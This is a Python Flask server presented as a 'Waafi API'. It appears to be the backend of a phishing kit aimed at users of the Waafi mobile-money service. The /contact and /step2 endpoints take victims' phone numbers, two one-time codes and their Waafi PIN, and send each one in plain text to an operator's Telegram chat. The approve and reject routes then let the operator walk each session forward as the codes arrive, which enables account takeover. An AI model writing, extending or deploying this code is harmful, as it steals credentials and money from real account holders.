from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from dotenv import load_dotenv

from sessions import (
    create_session,
    get_session,
    save_step2,
    update_status
)

load_dotenv()

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")


@app.route("/")
def home():
    return "Waafi API Running"


# ----------------------------
# STEP 1
# ----------------------------
@app.route("/contact", methods=["POST"])
def contact():

    data = request.json

    phone = data.get("phone")
    demo_code = data.get("code")

    session_id = create_session(phone, demo_code)

    message = f"""
🔔 New Application Request

📱 Phone Number:
{phone}

📝 OTP1:
{demo_code}

🆔 Session ID:
{session_id}

Status:
⏳ Pending Review
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(
        url,
        data={
            "chat_id": ADMIN_ID,
            "text": message
        }
    )

    return jsonify({
        "status": "success",
        "session_id": session_id
    })


# ----------------------------
# STEP 2
# ----------------------------
# ----------------------------
# STEP 2
# ----------------------------
# ----------------------------
# STEP 2
# ----------------------------
@app.route("/step2", methods=["POST"])
def step2():

    data = request.json

    session_id = data.get("session_id")
    Waafi_pin = data.get("waafi_pin")
    otp2 = data.get("otp2")

    save_step2(session_id, Waafi_pin, otp2)

    message = f"""
🔔 Second Step Received

📝 Otp2:
{otp2}

📌 WAAFI PIN:
{Waafi_pin}

🆔 Session ID:
{session_id}

Status:
⏳ Pending Review
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    requests.post(
        url,
        data={
            "chat_id": ADMIN_ID,
            "text": message
        }
    )

    return jsonify({
        "status": "success",
        "session_id": session_id
    })
# ----------------------------
# APPROVE
# ----------------------------
@app.route("/approve/<session_id>")
def approve(session_id):

    result = update_status(session_id, "approved")

    if result:
        return jsonify({
            "status": "approved",
            "session_id": session_id
        })

    return jsonify({
        "error": "Session not found"
    }), 404


# ----------------------------
# REJECT
# ----------------------------
@app.route("/reject/<session_id>")
def reject(session_id):

    result = update_status(session_id, "rejected")

    if result:
        return jsonify({
            "status": "rejected",
            "session_id": session_id
        })

    return jsonify({
        "error": "Session not found"
    }), 404


# ----------------------------
# CHECK SESSION
# ----------------------------
@app.route("/session/<session_id>")
def session(session_id):

    s = get_session(session_id)

    if not s:
        return jsonify({
            "error": "Session not found"
        }), 404

    return jsonify(s)


if __name__ == "__main__":
    app.run(debug=True)